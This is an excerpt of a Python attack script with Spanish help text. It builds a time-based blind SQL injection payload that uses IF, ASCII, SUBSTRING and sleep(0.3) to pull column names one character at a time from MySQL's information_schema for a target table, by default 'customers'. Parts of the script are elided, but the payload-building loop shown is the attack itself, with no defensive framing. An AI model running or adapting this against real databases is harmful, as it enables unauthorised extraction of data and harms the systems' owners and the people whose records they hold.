...
parse.add_argument('--table', dest="table_name", type=str, default="customers", help="Tabla de la que quieres ver sus columnas (default: customers)")
...
for row in range(20):
    p2 = log.progress(f"c0luMNa [{row}]")
    for pos_word in range(1,101):
        for letter in dic:
            payload = "IF(Ascii(substring((SELECT column_name FROM information_schema.columns WHERE "
            payload += f"table_schema='{args.db_name}' AND table_name='{args.table_name}' LIMIT {row},1),{pos_word},1))={ord(letter)},sleep(0.3),0)#"
